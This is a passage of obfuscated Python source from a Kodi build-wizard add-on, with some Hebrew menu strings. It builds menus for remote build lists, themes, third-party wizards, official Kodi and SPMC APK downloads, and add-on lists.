	addFile ('[COLOR %s]Local IP:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO0OO00O000OOOO00 [4 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:2193
	addFile ('[COLOR %s]External IP:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OOO0OO0000OOO0OOO ),'',icon =ICONMAINT ,themeit =THEME2 )#line:2194
	addFile ('[COLOR %s]Provider:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO0O00O000O0O000O ),'',icon =ICONMAINT ,themeit =THEME2 )#line:2195
	addFile ('[COLOR %s]Location:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO0OOO0OOO00O0000 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:2196
	addFile ('[COLOR %s]MacAddress:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO0OO00O000OOOO00 [5 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:2197
	setView ('files','viewType')#line:2198
def buildMenu ():#line:2200
	if USERNAME =='':#line:2201
		ADDON .openSettings ()#line:2202
		sys .exit ()#line:2203
	if PASSWORD =='':#line:2204
		ADDON .openSettings ()#line:2205
	OO0OOOOO000OO0O00 =(SPEEDFILE )#line:2206
	(OO0OOOOO000OO0O00 )#line:2207
	O0000OO00O00000O0 =(wiz .workingURL (OO0OOOOO000OO0O00 ))#line:2208
	(O0000OO00O00000O0 )#line:2209
	O0000OO00O00000O0 =wiz .workingURL (SPEEDFILE )#line:2210
	if not O0000OO00O00000O0 ==True :#line:2211
		addFile ('%s גירסה: %s'%(MCNAME ,KODIV ),'',icon =ICONBUILDS ,themeit =THEME3 )#line:2212
		addDir ('כניסה לשמירת נתונים','savedata',icon =ICONSAVE ,themeit =THEME3 )#line:2213
		if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:2214
		addFile ('בילדים לא זמינים אנא בדוק את חיבור האינטרנט','',icon =ICONBUILDS ,themeit =THEME3 )#line:2215
		addFile ('%s'%O0000OO00O00000O0 ,'',icon =ICONBUILDS ,themeit =THEME3 )#line:2216
	else :#line:2217
		OOO00OOO0O0O0OOO0 ,OO0OO0O00O0OO00O0 ,O000O000000OO0O00 ,OO0O00O0O0OOO0OOO ,OO000O0000000O000 ,OOOO0000O0O0OO00O ,OO0O00O000O0OOOOO =wiz .buildCount ()#line:2218
		OO0O000O0000O0OO0 =False ;O0O0OO0O0OO000O0O =[]#line:2219
		if THIRDPARTY =='true':#line:2220
			if not THIRD1NAME ==''and not THIRD1URL =='':OO0O000O0000O0OO0 =True ;O0O0OO0O0OO000O0O .append ('1')#line:2221
			if not THIRD2NAME ==''and not THIRD2URL =='':OO0O000O0000O0OO0 =True ;O0O0OO0O0OO000O0O .append ('2')#line:2222
			if not THIRD3NAME ==''and not THIRD3URL =='':OO0O000O0000O0OO0 =True ;O0O0OO0O0OO000O0O .append ('3')#line:2223
		O00OO00OOO0OOOOOO =wiz .openURL (SPEEDFILE ).replace ('\n','').replace ('\r','').replace ('\t','').replace ('gui=""','gui="http://"').replace ('theme=""','theme="http://"').replace ('adult=""','adult="no"')#line:2224
		O0OO0OOO00O00OO00 =re .compile ('name="(.+?)".+?ersion="(.+?)".+?rl="(.+?)".+?ui="(.+?)".+?odi="(.+?)".+?heme="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?dult="(.+?)".+?escription="(.+?)"').findall (O00OO00OOO0OOOOOO )#line:2225
		if OOO00OOO0O0O0OOO0 ==1 and OO0O000O0000O0OO0 ==False :#line:2226
			for O0000O0000OO000OO ,O0OO0O0O0OOO0OOOO ,OOO000O000000O000 ,OO00O000OO00O00O0 ,O0O00OOOOO0O00O00 ,OOOO0OOOOOO0O0O0O ,OOO000OOO0OO00O0O ,O000O0OOOOO0O0OOO ,OOO00OOO00O0O000O ,OO0O0O00OO00O0OO0 in O0OO0OOO00O00OO00 :#line:2227
				if not SHOWADULT =='true'and OOO00OOO00O0O000O .lower ()=='yes':continue #line:2228
				if not DEVELOPER =='true'and wiz .strTest (O0000O0000OO000OO ):continue #line:2229
				viewBuild (O0OO0OOO00O00OO00 [0 ][0 ])#line:2230
				return #line:2231
		addFile ('עדכון מהיר','fastupdate',icon =ICONSAVE ,themeit =THEME1 )#line:2234
		if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:2235
		if OO0O000O0000O0OO0 ==True :#line:2236
			for OO0O00OO0OOOOOO00 in O0O0OO0O0OO000O0O :#line:2237
				O0000O0000OO000OO =eval ('THIRD%sNAME'%OO0O00OO0OOOOOO00 )#line:2238
		if len (O0OO0OOO00O00OO00 )>=1 :#line:2240
			if SEPERATE =='true':#line:2241
				for O0000O0000OO000OO ,O0OO0O0O0OOO0OOOO ,OOO000O000000O000 ,OO00O000OO00O00O0 ,O0O00OOOOO0O00O00 ,OOOO0OOOOOO0O0O0O ,OOO000OOO0OO00O0O ,O000O0OOOOO0O0OOO ,OOO00OOO00O0O000O ,OO0O0O00OO00O0OO0 in O0OO0OOO00O00OO00 :#line:2242
					if not SHOWADULT =='true'and OOO00OOO00O0O000O .lower ()=='yes':continue #line:2243
					if not DEVELOPER =='true'and wiz .strTest (O0000O0000OO000OO ):continue #line:2244
					OOOOO00OO000O000O =createMenu ('install','',O0000O0000OO000OO )#line:2245
					addDir ('[%s] %s (v%s)'%(float (O0O00OOOOO0O00O00 ),O0000O0000OO000OO ,O0OO0O0O0OOO0OOOO ),'viewbuild',O0000O0000OO000OO ,description =OO0O0O00OO00O0OO0 ,fanart =O000O0OOOOO0O0OOO ,icon =OOO000OOO0OO00O0O ,menu =OOOOO00OO000O000O ,themeit =THEME2 )#line:2246
			else :#line:2247
				if OO0O00O0O0OOO0OOO >0 :#line:2248
					O0O0O0O00OO00OO00 ='+'if SHOW17 =='false'else '-'#line:2249
					if SHOW17 =='true':#line:2251
						for O0000O0000OO000OO ,O0OO0O0O0OOO0OOOO ,OOO000O000000O000 ,OO00O000OO00O00O0 ,O0O00OOOOO0O00O00 ,OOOO0OOOOOO0O0O0O ,OOO000OOO0OO00O0O ,O000O0OOOOO0O0OOO ,OOO00OOO00O0O000O ,OO0O0O00OO00O0OO0 in O0OO0OOO00O00OO00 :#line:2253
							if not SHOWADULT =='true'and OOO00OOO00O0O000O .lower ()=='yes':continue #line:2254
							if not DEVELOPER =='true'and wiz .strTest (O0000O0000OO000OO ):continue #line:2255
							O0OOO0O00000OOO00 =int (float (O0O00OOOOO0O00O00 ))#line:2256
							if O0OOO0O00000OOO00 ==17 :#line:2257
								OOOOO00OO000O000O =createMenu ('install','',O0000O0000OO000OO )#line:2258
								addDir ('[%s] %s (v%s)'%(float (O0O00OOOOO0O00O00 ),O0000O0000OO000OO ,O0OO0O0O0OOO0OOOO ),'viewbuild',O0000O0000OO000OO ,description =OO0O0O00OO00O0OO0 ,fanart =O000O0OOOOO0O0OOO ,icon =OOO000OOO0OO00O0O ,menu =OOOOO00OO000O000O ,themeit =THEME2 )#line:2259
				if OO000O0000000O000 >0 :#line:2260
					O0O0O0O00OO00OO00 ='+'if SHOW18 =='false'else '-'#line:2261
					if SHOW18 =='true':#line:2263
						for O0000O0000OO000OO ,O0OO0O0O0OOO0OOOO ,OOO000O000000O000 ,OO00O000OO00O00O0 ,O0O00OOOOO0O00O00 ,OOOO0OOOOOO0O0O0O ,OOO000OOO0OO00O0O ,O000O0OOOOO0O0OOO ,OOO00OOO00O0O000O ,OO0O0O00OO00O0OO0 in O0OO0OOO00O00OO00 :#line:2265
							if not SHOWADULT =='true'and OOO00OOO00O0O000O .lower ()=='yes':continue #line:2266
							if not DEVELOPER =='true'and wiz .strTest (O0000O0000OO000OO ):continue #line:2267
							O0OOO0O00000OOO00 =int (float (O0O00OOOOO0O00O00 ))#line:2268
							if O0OOO0O00000OOO00 ==18 :#line:2269
								OOOOO00OO000O000O =createMenu ('install','',O0000O0000OO000OO )#line:2270
								addDir ('[%s] %s (v%s)'%(float (O0O00OOOOO0O00O00 ),O0000O0000OO000OO ,O0OO0O0O0OOO0OOOO ),'viewbuild',O0000O0000OO000OO ,description =OO0O0O00OO00O0OO0 ,fanart =O000O0OOOOO0O0OOO ,icon =OOO000OOO0OO00O0O ,menu =OOOOO00OO000O000O ,themeit =THEME2 )#line:2271
				if O000O000000OO0O00 >0 :#line:2272
					O0O0O0O00OO00OO00 ='+'if SHOW16 =='false'else '-'#line:2273
					addFile ('[B]%s Jarvis Builds(%s)[/B]'%(O0O0O0O00OO00OO00 ,O000O000000OO0O00 ),'togglesetting','show16',themeit =THEME3 )#line:2274
					if SHOW16 =='true':#line:2275
						for O0000O0000OO000OO ,O0OO0O0O0OOO0OOOO ,OOO000O000000O000 ,OO00O000OO00O00O0 ,O0O00OOOOO0O00O00 ,OOOO0OOOOOO0O0O0O ,OOO000OOO0OO00O0O ,O000O0OOOOO0O0OOO ,OOO00OOO00O0O000O ,OO0O0O00OO00O0OO0 in O0OO0OOO00O00OO00 :#line:2276
							if not SHOWADULT =='true'and OOO00OOO00O0O000O .lower ()=='yes':continue #line:2277
							if not DEVELOPER =='true'and wiz .strTest (O0000O0000OO000OO ):continue #line:2278
							O0OOO0O00000OOO00 =int (float (O0O00OOOOO0O00O00 ))#line:2279
							if O0OOO0O00000OOO00 ==16 :#line:2280
								OOOOO00OO000O000O =createMenu ('install','',O0000O0000OO000OO )#line:2281
								addDir ('[%s] %s (v%s)'%(float (O0O00OOOOO0O00O00 ),O0000O0000OO000OO ,O0OO0O0O0OOO0OOOO ),'viewbuild',O0000O0000OO000OO ,description =OO0O0O00OO00O0OO0 ,fanart =O000O0OOOOO0O0OOO ,icon =OOO000OOO0OO00O0O ,menu =OOOOO00OO000O000O ,themeit =THEME2 )#line:2282
				if OO0OO0O00O0OO00O0 >0 :#line:2283
					O0O0O0O00OO00OO00 ='+'if SHOW15 =='false'else '-'#line:2284
					addFile ('[B]%s Isengard and Below Builds(%s)[/B]'%(O0O0O0O00OO00OO00 ,OO0OO0O00O0OO00O0 ),'togglesetting','show15',themeit =THEME3 )#line:2285
					if SHOW15 =='true':#line:2286
						for O0000O0000OO000OO ,O0OO0O0O0OOO0OOOO ,OOO000O000000O000 ,OO00O000OO00O00O0 ,O0O00OOOOO0O00O00 ,OOOO0OOOOOO0O0O0O ,OOO000OOO0OO00O0O ,O000O0OOOOO0O0OOO ,OOO00OOO00O0O000O ,OO0O0O00OO00O0OO0 in O0OO0OOO00O00OO00 :#line:2287
							if not SHOWADULT =='true'and OOO00OOO00O0O000O .lower ()=='yes':continue #line:2288
							if not DEVELOPER =='true'and wiz .strTest (O0000O0000OO000OO ):continue #line:2289
							O0OOO0O00000OOO00 =int (float (O0O00OOOOO0O00O00 ))#line:2290
							if O0OOO0O00000OOO00 <=15 :#line:2291
								OOOOO00OO000O000O =createMenu ('install','',O0000O0000OO000OO )#line:2292
								addDir ('[%s] %s (v%s)'%(float (O0O00OOOOO0O00O00 ),O0000O0000OO000OO ,O0OO0O0O0OOO0OOOO ),'viewbuild',O0000O0000OO000OO ,description =OO0O0O00OO00O0OO0 ,fanart =O000O0OOOOO0O0OOO ,icon =OOO000OOO0OO00O0O ,menu =OOOOO00OO000O000O ,themeit =THEME2 )#line:2293
		elif OO0O00O000O0OOOOO >0 :#line:2294
			if OOOO0000O0O0OO00O >0 :#line:2295
				addFile ('There is currently only Adult builds','',icon =ICONBUILDS ,themeit =THEME3 )#line:2296
				addFile ('Enable Show Adults in Addon Settings > Misc','',icon =ICONBUILDS ,themeit =THEME3 )#line:2297
			else :#line:2298
				addFile ('Currently No Builds Offered from %s'%ADDONTITLE ,'',icon =ICONBUILDS ,themeit =THEME3 )#line:2299
		else :addFile ('Text file for builds not formated correctly.','',icon =ICONBUILDS ,themeit =THEME3 )#line:2300
	setView ('files','viewType')#line:2301
def viewBuild (O000O0OOOO000OO0O ):#line:2303
	OO0O000OO0OOO000O =wiz .workingURL (SPEEDFILE )#line:2304
	if not OO0O000OO0OOO000O ==True :#line:2305
		addFile ('בילדים לא זמינים אנא בדוק את חיבור האינטרנט','',themeit =THEME3 )#line:2306
		addFile ('%s'%OO0O000OO0OOO000O ,'',themeit =THEME3 )#line:2307
		return #line:2308
	if wiz .checkBuild (O000O0OOOO000OO0O ,'version')==False :#line:2309
		addFile ('Error reading the txt file.','',themeit =THEME3 )#line:2310
		addFile ('%s was not found in the builds list.'%O000O0OOOO000OO0O ,'',themeit =THEME3 )#line:2311
		return #line:2312
	OO00O00O0O0000000 =wiz .openURL (SPEEDFILE ).replace ('\n','').replace ('\r','').replace ('\t','').replace ('gui=""','gui="http://"').replace ('theme=""','theme="http://"')#line:2313
	OO00OOOO0O000O00O =re .compile ('name="%s".+?ersion="(.+?)".+?rl="(.+?)".+?ui="(.+?)".+?odi="(.+?)".+?heme="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?review="(.+?)".+?dult="(.+?)".+?escription="(.+?)"'%O000O0OOOO000OO0O ).findall (OO00O00O0O0000000 )#line:2314
	for O00O0O0000OOO000O ,OOO0OO00O0O0O00O0 ,OO0O0O000OOO0O000 ,OO0OO0O000OOOOO0O ,O0000O000O0O0O00O ,OOO0O0O0OO0O0OO0O ,OO0OO0O0000OO0000 ,O000O0O0OOOO00000 ,OO00O000O0OO00O0O ,O0000OOO0O0000O00 in OO00OOOO0O000O00O :#line:2315
		OOO0O0O0OO0O0OO0O =OOO0O0O0OO0O0OO0O if wiz .workingURL (OOO0O0O0OO0O0OO0O )else ICON #line:2316
		OO0OO0O0000OO0000 =OO0OO0O0000OO0000 if wiz .workingURL (OO0OO0O0000OO0000 )else FANART #line:2317
		OO0O0O0O0OO0OOOOO ='%s (v%s)'%(O000O0OOOO000OO0O ,O00O0O0000OOO000O )#line:2318
		if BUILDNAME ==O000O0OOOO000OO0O and O00O0O0000OOO000O >BUILDVERSION :#line:2319
			OO0O0O0O0OO0OOOOO ='%s [COLOR red][CURRENT v%s][/COLOR]'%(OO0O0O0O0OO0OOOOO ,BUILDVERSION )#line:2320
		OOO0000O0000OOO00 =int (float (KODIV ));OOO0000O000OO0000 =int (float (OO0OO0O000OOOOO0O ))#line:2329
		if not OOO0000O0000OOO00 ==OOO0000O000OO0000 :#line:2330
			if OOO0000O0000OOO00 ==16 and OOO0000O000OO0000 <=15 :O000OOO00O0OOO000 =False #line:2331
			else :O000OOO00O0OOO000 =True #line:2332
		else :O000OOO00O0OOO000 =False #line:2333
		addFile ('התקנה','install',O000O0OOOO000OO0O ,'fresh',description =O0000OOO0O0000O00 ,fanart =OO0OO0O0000OO0000 ,icon =OOO0O0O0OO0O0OO0O ,themeit =THEME1 )#line:2337
		if not O0000O000O0O0O00O =='http://':#line:2340
			if wiz .workingURL (O0000O000O0O0O00O )==True :#line:2341
				addFile (wiz .sep ('THEMES'),'',fanart =OO0OO0O0000OO0000 ,icon =OOO0O0O0OO0O0OO0O ,themeit =THEME3 )#line:2342
				OO00O00O0O0000000 =wiz .openURL (O0000O000O0O0O00O ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2343
				OO00OOOO0O000O00O =re .compile ('name="(.+?)".+?rl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?dult="(.+?)".+?escription="(.+?)"').findall (OO00O00O0O0000000 )#line:2344
				for OO0O00OOOO0O000O0 ,O000OOO00OOOOO00O ,O0OOOOOO00OOOOO0O ,O0000O00O00O000O0 ,OOOO000O0OO00O0OO ,O0000OOO0O0000O00 in OO00OOOO0O000O00O :#line:2345
					if not SHOWADULT =='true'and OOOO000O0OO00O0OO .lower ()=='yes':continue #line:2346
					O0OOOOOO00OOOOO0O =O0OOOOOO00OOOOO0O if O0OOOOOO00OOOOO0O =='http://'else OOO0O0O0OO0O0OO0O #line:2347
					O0000O00O00O000O0 =O0000O00O00O000O0 if O0000O00O00O000O0 =='http://'else OO0OO0O0000OO0000 #line:2348
					addFile (OO0O00OOOO0O000O0 if not OO0O00OOOO0O000O0 ==BUILDTHEME else "[B]%s (Installed)[/B]"%OO0O00OOOO0O000O0 ,'theme',O000O0OOOO000OO0O ,OO0O00OOOO0O000O0 ,description =O0000OOO0O0000O00 ,fanart =O0000O00O00O000O0 ,icon =O0OOOOOO00OOOOO0O ,themeit =THEME3 )#line:2349
	setView ('files','viewType')#line:2350
def viewThirdList (OO00O000O0OO0OO0O ):#line:2352
	O000OO0O0O0OOOOOO =eval ('THIRD%sNAME'%OO00O000O0OO0OO0O )#line:2353
	O000O000O0O00OO0O =eval ('THIRD%sURL'%OO00O000O0OO0OO0O )#line:2354
	O000OOO0O0OOOOOO0 =wiz .workingURL (O000O000O0O00OO0O )#line:2355
	if not O000OOO0O0OOOOOO0 ==True :#line:2356
		addFile ('Url for txt file not valid','',icon =ICONBUILDS ,themeit =THEME3 )#line:2357
		addFile ('%s'%WORKINGURL ,'',icon =ICONBUILDS ,themeit =THEME3 )#line:2358
	else :#line:2359
		O0OOO0O0000OOOO0O ,O00OO0O00O000000O =wiz .thirdParty (O000O000O0O00OO0O )#line:2360
		addFile ("[B]%s[/B]"%O000OO0O0O0OOOOOO ,'',themeit =THEME3 )#line:2361
		if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:2362
		if O0OOO0O0000OOOO0O :#line:2363
			for O000OO0O0O0OOOOOO ,OO00O0OOOOOOO0O00 ,O000O000O0O00OO0O ,O0O0O00OO0OOO0000 ,O0OO0O0O0OOO0OO0O ,O000O0OO00O0OOO0O ,O00O0OOO0O000O0OO ,OOOOO0OO0OO0OOOOO in O00OO0O00O000000O :#line:2364
				if not SHOWADULT =='true'and O00O0OOO0O000O0OO .lower ()=='yes':continue #line:2365
				addFile ("[%s] %s v%s"%(O0O0O00OO0OOO0000 ,O000OO0O0O0OOOOOO ,OO00O0OOOOOOO0O00 ),'installthird',O000OO0O0O0OOOOOO ,O000O000O0O00OO0O ,icon =O0OO0O0O0OOO0OO0O ,fanart =O000O0OO00O0OOO0O ,description =OOOOO0OO0OO0OOOOO ,themeit =THEME2 )#line:2366
		else :#line:2367
			for O000OO0O0O0OOOOOO ,O000O000O0O00OO0O ,O0OO0O0O0OOO0OO0O ,O000O0OO00O0OOO0O ,OOOOO0OO0OO0OOOOO in O00OO0O00O000000O :#line:2368
				addFile (O000OO0O0O0OOOOOO ,'installthird',O000OO0O0O0OOOOOO ,O000O000O0O00OO0O ,icon =O0OO0O0O0OOO0OO0O ,fanart =O000O0OO00O0OOO0O ,description =OOOOO0OO0OO0OOOOO ,themeit =THEME2 )#line:2369
def editThirdParty (OOOO0OO000O00O00O ):#line:2371
	O0O00OOO0O00OO000 =eval ('THIRD%sNAME'%OOOO0OO000O00O00O )#line:2372
	O0OOOO0O00O0OOOOO =eval ('THIRD%sURL'%OOOO0OO000O00O00O )#line:2373
	O0O00O00OO00OOO0O =wiz .getKeyboard (O0O00OOO0O00OO000 ,'Enter the Name of the Wizard')#line:2374
	O00O0O0O00O0000O0 =wiz .getKeyboard (O0OOOO0O00O0OOOOO ,'Enter the URL of the Wizard Text')#line:2375
	wiz .setS ('wizard%sname'%OOOO0OO000O00O00O ,O0O00O00OO00OOO0O )#line:2377
	wiz .setS ('wizard%surl'%OOOO0OO000O00O00O ,O00O0O0O00O0000O0 )#line:2378
def apkScraper (name =""):#line:2380
	if name =='kodi':#line:2381
		OO0OOOOOOOO0O0O00 ='http://mirrors.kodi.tv/releases/android/arm/'#line:2382
		OO0000OOO000OO0O0 ='http://mirrors.kodi.tv/releases/android/arm/old/'#line:2383
		OO0O000OOOO0000OO =wiz .openURL (OO0OOOOOOOO0O0O00 ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2384
		O000OO0O0OOOO000O =wiz .openURL (OO0000OOO000OO0O0 ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2385
		O00O00OOOO00O0O0O =0 #line:2386
		O0000OO0OO0O00O00 =re .compile ('<tr><td><a href="(.+?)">(.+?)</a></td><td>(.+?)</td><td>(.+?)</td></tr>').findall (OO0O000OOOO0000OO )#line:2387
		O00OOO0O0O00O00O0 =re .compile ('<tr><td><a href="(.+?)">(.+?)</a></td><td>(.+?)</td><td>(.+?)</td></tr>').findall (O000OO0O0OOOO000O )#line:2388
		addFile ("Official Kodi Apk\'s",themeit =THEME1 )#line:2390
		OOOOOO0OO0OOOOOO0 =False #line:2391
		for O0000O00O00000000 ,name ,OOOO0OOO0000000OO ,OOO00O0O0OO000O00 in O0000OO0OO0O00O00 :#line:2392
			if O0000O00O00000000 in ['../','old/']:continue #line:2393
			if not O0000O00O00000000 .endswith ('.apk'):continue #line:2394
			if not O0000O00O00000000 .find ('_')==-1 and OOOOOO0OO0OOOOOO0 ==True :continue #line:2395
			try :#line:2396
				O000O0O000OO00O0O =name .split ('-')#line:2397
				if not O0000O00O00000000 .find ('_')==-1 :#line:2398
					OOOOOO0OO0OOOOOO0 =True #line:2399
					OOOO0OO0000000O00 ,OOO0O0OOO0O0OO00O =O000O0O000OO00O0O [2 ].split ('_')#line:2400
				else :#line:2401
					OOOO0OO0000000O00 =O000O0O000OO00O0O [2 ]#line:2402
					OOO0O0OOO0O0OO00O =''#line:2403
				O0OOO000OO0O0OOOO ="[COLOR %s]%s v%s%s %s[/COLOR] [COLOR %s]%s[/COLOR] [COLOR %s]%s[/COLOR]"%(COLOR1 ,O000O0O000OO00O0O [0 ].title (),O000O0O000OO00O0O [1 ],OOO0O0OOO0O0OO00O .upper (),OOOO0OO0000000O00 ,COLOR2 ,OOOO0OOO0000000OO .replace (' ',''),COLOR1 ,OOO00O0O0OO000O00 )#line:2404
				O0O0OOO0OO00000OO =urljoin (OO0OOOOOOOO0O0O00 ,O0000O00O00000000 )#line:2405
				addFile (O0OOO000OO0O0OOOO ,'apkinstall',"%s v%s%s %s"%(O000O0O000OO00O0O [0 ].title (),O000O0O000OO00O0O [1 ],OOO0O0OOO0O0OO00O .upper (),OOOO0OO0000000O00 ),O0O0OOO0OO00000OO )#line:2406
				O00O00OOOO00O0O0O +=1 #line:2407
			except :#line:2408
				wiz .log ("Error on: %s"%name )#line:2409
		for O0000O00O00000000 ,name ,OOOO0OOO0000000OO ,OOO00O0O0OO000O00 in O00OOO0O0O00O00O0 :#line:2411
			if O0000O00O00000000 in ['../','old/']:continue #line:2412
			if not O0000O00O00000000 .endswith ('.apk'):continue #line:2413
			if not O0000O00O00000000 .find ('_')==-1 :continue #line:2414
			try :#line:2415
				O000O0O000OO00O0O =name .split ('-')#line:2416
				O0OOO000OO0O0OOOO ="[COLOR %s]%s v%s %s[/COLOR] [COLOR %s]%s[/COLOR] [COLOR %s]%s[/COLOR]"%(COLOR1 ,O000O0O000OO00O0O [0 ].title (),O000O0O000OO00O0O [1 ],O000O0O000OO00O0O [2 ],COLOR2 ,OOOO0OOO0000000OO .replace (' ',''),COLOR1 ,OOO00O0O0OO000O00 )#line:2417
				O0O0OOO0OO00000OO =urljoin (OO0000OOO000OO0O0 ,O0000O00O00000000 )#line:2418
				addFile (O0OOO000OO0O0OOOO ,'apkinstall',"%s v%s %s"%(O000O0O000OO00O0O [0 ].title (),O000O0O000OO00O0O [1 ],O000O0O000OO00O0O [2 ]),O0O0OOO0OO00000OO )#line:2419
				O00O00OOOO00O0O0O +=1 #line:2420
			except :#line:2421
				wiz .log ("Error on: %s"%name )#line:2422
		if O00O00OOOO00O0O0O ==0 :addFile ("Error Kodi Scraper Is Currently Down.")#line:2423
	elif name =='spmc':#line:2424
		O0O0OOOOO000OOOO0 ='https://github.com/koying/SPMC/releases'#line:2425
		OO0O000OOOO0000OO =wiz .openURL (O0O0OOOOO000OOOO0 ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2426
		O00O00OOOO00O0O0O =0 #line:2427
		O0000OO0OO0O00O00 =re .compile ('<div.+?lass="release-body.+?div class="release-header".+?a href=.+?>(.+?)</a>.+?ul class="release-downloads">(.+?)</ul>.+?/div>').findall (OO0O000OOOO0000OO )#line:2428
		addFile ("Official SPMC Apk\'s",themeit =THEME1 )#line:2430
		for name ,O0O0O000OO0O00OO0 in O0000OO0OO0O00O00 :#line:2432
			O00O0OOOOO0OO0O0O =''#line:2433
			O00OOO0O0O00O00O0 =re .compile ('<li>.+?<a href="(.+?)" rel="nofollow">.+?<small class="text-gray float-right">(.+?)</small>.+?strong>(.+?)</strong>.+?</a>.+?</li>').findall (O0O0O000OO0O00OO0 )#line:2434
			for OOOOO0OOOO0000O00 ,OOOOOO000OOOOOO00 ,OO0O0O0O00OOOOO00 in O00OOO0O0O00O00O0 :#line:2435
				if OO0O0O0O00OOOOO00 .find ('armeabi')==-1 :continue #line:2436
				if OO0O0O0O00OOOOO00 .find ('launcher')>-1 :continue #line:2437
				O00O0OOOOO0OO0O0O =urljoin ('https://github.com',OOOOO0OOOO0000O00 )#line:2438
				break #line:2439
		if O00O00OOOO00O0O0O ==0 :addFile ("Error SPMC Scraper Is Currently Down.")#line:2441
def apkMenu (url =None ):#line:2443
	if url ==None :#line:2444
		if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:2447
	if not APKFILE =='http://':#line:2448
		if url ==None :#line:2449
			O0O00O0O0O0OOO0OO =wiz .workingURL (APKFILE )#line:2450
			OOOOO000OOO0OO0O0 =uservar .APKFILE #line:2451
		else :#line:2452
			O0O00O0O0O0OOO0OO =wiz .workingURL (url )#line:2453
			OOOOO000OOO0OO0O0 =url #line:2454
		if O0O00O0O0O0OOO0OO ==True :#line:2455
			O00OOO0O00OOOOO00 =wiz .openURL (OOOOO000OOO0OO0O0 ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2456
			OO0OOO00OO0OOOOOO =re .compile ('name="(.+?)".+?ection="(.+?)".+?rl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?dult="(.+?)".+?escription="(.+?)"').findall (O00OOO0O00OOOOO00 )#line:2457
			if len (OO0OOO00OO0OOOOOO )>0 :#line:2458
				O0OO0O00OO000O000 =0 #line:2459
				for O000OO00000O0OOO0 ,OO00O000O0O00OO0O ,url ,OO00OO00O00OO0O00 ,O0O000O0000OO00O0 ,OOOOO000OOO0OO0OO ,O00OO00O0O0O0OO00 in OO0OOO00OO0OOOOOO :#line:2460
					if not SHOWADULT =='true'and OOOOO000OOO0OO0OO .lower ()=='yes':continue #line:2461
					if OO00O000O0O00OO0O .lower ()=='yes':#line:2462
						O0OO0O00OO000O000 +=1 #line:2463
						addDir ("[B]%s[/B]"%O000OO00000O0OOO0 ,'apk',url ,description =O00OO00O0O0O0OO00 ,icon =OO00OO00O00OO0O00 ,fanart =O0O000O0000OO00O0 ,themeit =THEME3 )#line:2464
					else :#line:2465
						O0OO0O00OO000O000 +=1 #line:2466
						addFile (O000OO00000O0OOO0 ,'apkinstall',O000OO00000O0OOO0 ,url ,description =O00OO00O0O0O0OO00 ,icon =OO00OO00O00OO0O00 ,fanart =O0O000O0000OO00O0 ,themeit =THEME2 )#line:2467
					if O0OO0O00OO000O000 <1 :#line:2468
						addFile ("No addons added to this menu yet!",'',themeit =THEME2 )#line:2469
			else :wiz .log ("[APK Menu] ERROR: Invalid Format.",xbmc .LOGERROR )#line:2470
		else :#line:2471
			wiz .log ("[APK Menu] ERROR: URL for apk list not working.",xbmc .LOGERROR )#line:2472
			addFile ('Url for txt file not valid','',themeit =THEME3 )#line:2473
			addFile ('%s'%O0O00O0O0O0OOO0OO ,'',themeit =THEME3 )#line:2474
		return #line:2475
	else :wiz .log ("[APK Menu] No APK list added.")#line:2476
	setView ('files','viewType')#line:2477
def addonMenu (url =None ):#line:2479
	if not ADDONFILE =='http://':#line:2480
		if url ==None :#line:2481
			OOO0O0O00OO0OOO00 =wiz .workingURL (ADDONFILE )#line:2482
			OOO00O000000O0OO0 =uservar .ADDONFILE #line:2483
		else :#line:2484
			OOO0O0O00OO0OOO00 =wiz .workingURL (url )#line:2485
			OOO00O000000O0OO0 =url #line:2486
		if OOO0O0O00OO0OOO00 ==True :#line:2487
			O0OOOO0OOO0O0000O =wiz .openURL (OOO00O000000O0OO0 ).replace ('\n','').replace ('\r','').replace ('\t','').replace ('repository=""','repository="none"').replace ('repositoryurl=""','repositoryurl="http://"').replace ('repositoryxml=""','repositoryxml="http://"')#line:2488
			O0O000O0O0O0O0O00 =re .compile ('name="(.+?)".+?lugin="(.+?)".+?rl="(.+?)".+?epository="(.+?)".+?epositoryxml="(.+?)".+?epositoryurl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?dult="(.+?)".+?escription="(.+?)"').findall (O0OOOO0OOO0O0000O )#line:2489
			if len (O0O000O0O0O0O0O00 )>0 :#line:2490
				O0000OOO000000OOO =0 #line:2491
				for OOOOOO000O00O00O0 ,OO0O0OO000O0OO0O0 ,url ,OO0OOOOO00O0O00OO ,OO0OOO000O0OOO000 ,O0OOO0000000O0000 ,OOOOOO00O00O0O0OO ,OOOO0O0O0000OO0OO ,OO0O00O00O00OO0OO ,O0O0OOO0O0O0O00OO in O0O000O0O0O0O0O00 :#line:2492
					if OO0O0OO000O0OO0O0 .lower ()=='section':#line:2493
						O0000OOO000000OOO +=1 #line:2494
						addDir ("[B]%s[/B]"%OOOOOO000O00O00O0 ,'addons',url ,description =O0O0OOO0O0O0O00OO ,icon =OOOOOO00O00O0O0OO ,fanart =OOOO0O0O0000OO0OO ,themeit =THEME3 )#line:2495
					else :#line:2496
						if not SHOWADULT =='true'and OO0O00O00O00OO0OO .lower ()=='yes':continue #line:2497
						try :#line:2498
							OO0OOOOO00OOO0O0O =xbmcaddon .Addon (id =OO0O0OO000O0OO0O0 ).getAddonInfo ('path')#line:2499
